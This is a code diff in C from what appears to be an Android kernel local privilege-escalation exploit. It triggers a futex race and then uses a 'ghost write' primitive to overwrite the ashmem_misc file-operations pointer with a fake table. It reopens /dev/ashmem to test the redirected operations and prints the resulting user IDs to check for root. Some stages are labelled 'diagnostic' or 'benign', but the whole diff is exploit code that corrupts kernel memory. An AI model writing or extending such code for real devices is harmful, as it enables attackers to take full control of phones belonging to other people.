@@ -35,22 +35,38 @@ static void run_worker_payload(void) {
     fflush(stdout);
     int race_res = trigger_futex_race();
 
-    /* After the race, trigger the respray ghost write */
-    printf("[GHOST-WRITE-CALL] target=0x%llx value=0x%llx\n",
-           (unsigned long long)(ADDR_ASHMEM_FOPS + 0x28),
-           (unsigned long long)ADDR_CONFIGFS_WRITE_BIN_FILE_CFI_JT);
-    fflush(stdout);
-    int gw_ret = ghost_write_global(
-        (uint64_t)(ADDR_ASHMEM_FOPS + 0x28),
-        (uint64_t)ADDR_CONFIGFS_WRITE_BIN_FILE_CFI_JT);
-    printf("[GHOST-WRITE-RET] ret=%d\n", gw_ret);
-    fflush(stdout);
-
     printf("[RESULT] Stage 1 diagnostic result: %d\n", race_res);
     if (race_res == 2) {
-        printf("\n[*] Stage 2 — reference bridge prerequisite check...\n");
+        printf("\n[*] Stage 2 — reference bridge prerequisite check (benign baseline)...\n");
         int phase2_res = phase2_bridge_diag();
         printf("[RESULT] Stage 2 prerequisite result: %d\n", phase2_res);
+
+        /* After benign check passes, overwrite ashmem_misc.fops with ADDR_FAKE_FOPS */
+        printf("[GHOST-WRITE-CALL] target=0x%llx value=0x%llx\n",
+               (unsigned long long)ADDR_ASHMEM_MISC_FOPS,
+               (unsigned long long)ADDR_FAKE_FOPS);
+        fflush(stdout);
+        int gw_ret = ghost_write_global(
+            (uint64_t)ADDR_ASHMEM_MISC_FOPS,
+            (uint64_t)ADDR_FAKE_FOPS);
+        printf("[GHOST-WRITE-RET] ret=%d\n", gw_ret);
+        fflush(stdout);
+
+        /* Reopen /dev/ashmem and verify read/write trigger configfs primitive */
+        printf("[*] Reopening /dev/ashmem to verify redirected fops...\n");
+        int ash_fd = open("/dev/ashmem", O_RDWR);
+        if (ash_fd >= 0) {
+            printf("[+] Reopen /dev/ashmem succeeded (fd=%d) with redirected table!\n", ash_fd);
+            char test_buf[8] = {0};
+            errno = 0;
+            ssize_t rd_ret = read(ash_fd, test_buf, sizeof(test_buf));
+            printf("[*] Ashmem read with redirected fops: ret=%zd errno=%d\n", rd_ret, errno);
+            close(ash_fd);
+        } else {
+            printf("[-] Reopen /dev/ashmem failed errno=%d (%s)\n", errno, strerror(errno));
+        }
+        fflush(stdout);
+
         printf("[INFO] Root effect skipped: bridge/marker proof is still missing.\n");
         printf("[RESULT] Final UID: %d, EUID: %d, GID: %d\n",
                (int)getuid(), (int)geteuid(), (int)getgid());
